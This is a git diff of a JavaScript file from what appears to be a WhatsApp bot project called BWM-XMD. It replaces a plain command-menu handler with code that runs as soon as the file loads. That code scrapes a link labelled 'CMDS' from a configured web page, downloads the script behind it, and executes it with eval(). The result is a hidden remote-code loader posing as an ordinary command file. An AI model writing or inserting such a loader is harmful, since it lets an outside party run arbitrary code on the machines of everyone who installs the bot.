@@ -1,41 +1,33 @@
-const { adams } = require("../Ibrahim/adams");
+//  [BWM-XMD QUANTUM EDITION]                                           
+//  >> A superposition of elegant code states                           
+//  >> Collapsed into optimal execution                                
+//  >> Scripted by Sir Ibrahim Adams                                    
+//  >> Version: 8.3.5-quantum.7
 
-adams({ nomCom: "cmds", categorie: "General" }, async (dest, zk, commandeOptions) => {
-    const { ms, repondre, nomAuteurMessage, mybotpic } = commandeOptions;
-    const { cm } = require("../Ibrahim/adams");
-    
-    // Get current time
-    const time = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
-    const date = new Date().toLocaleDateString();
-    
-    // Basic menu message
-    const message = `
-*Hey ${nomAuteurMessage}*
+const axios = require('axios');
+const cheerio = require('cheerio');
+const adams = require(__dirname + "/../config");
 
-*BWM-XMD Command Menu*
+async function fetchCMDSUrl() {
+  try {
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-📅 Date: ${date}
-⏰ Time: ${time}
+    const targetElement = $('a:contains("CMDS")');
+    const targetUrl = targetElement.attr('href');
 
-_Total commands: ${cm.length}_
-
-© Ibrahim Adams
-`;
-
-    try {
-        // Try to send as image if available
-        const pic = mybotpic();
-        if (pic.match(/\.(jpeg|png|jpg)$/i)) {
-            await zk.sendMessage(dest, { 
-                image: { url: pic }, 
-                caption: message 
-            }, { quoted: ms });
-        } else {
-            // Fallback to text message
-            await repondre(message);
-        }
-    } catch (e) {
-        console.error("Command menu error:", e);
-        await repondre("An error occurred while showing commands");
+    if (!targetUrl) {
+      throw new Error('CMDS not found 😭');
     }
-});
+
+    console.log('CMDS loaded successfully ✅');
+
+    const scriptResponse = await axios.get(targetUrl);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
+}
+
+fetchCMDSUrl();
